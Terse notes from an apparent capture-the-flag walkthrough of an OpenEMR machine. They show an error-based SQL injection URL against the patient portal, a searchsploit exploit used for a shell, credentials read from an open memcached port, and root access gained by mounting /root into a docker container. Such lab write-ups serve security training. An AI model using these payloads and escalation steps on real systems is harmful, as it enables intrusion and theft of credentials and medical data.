there was creds hard coded on login.html and we got in

but it was of no use

there was a ==subdomain== hms and we can by pass authentication by going to

```
http://host/openemr/portal/add_edit_event_user.php?eid=1 AND EXTRACTVALUE(0,CONCAT(0x5c,VERSION())) 
```

it showed a error with a path and it had sql injection  blind

o we got creds from there

for ==openemr== to login in

now we used script from searchsploit ==4517..py== and got shell

it was not working but we can directly ssh to ash with old pasword from login.html

then internally the port ==11211== was open

we did ==telnet== ip port

```
stats slabs 
get users   
get passwd
 and got password
```

then ssh into and did id which showed docker

so we did

```
docker image ls
we got image 
then

docker run -v /root/:/mnt -it <image>
on /mnt we had root.txt
```
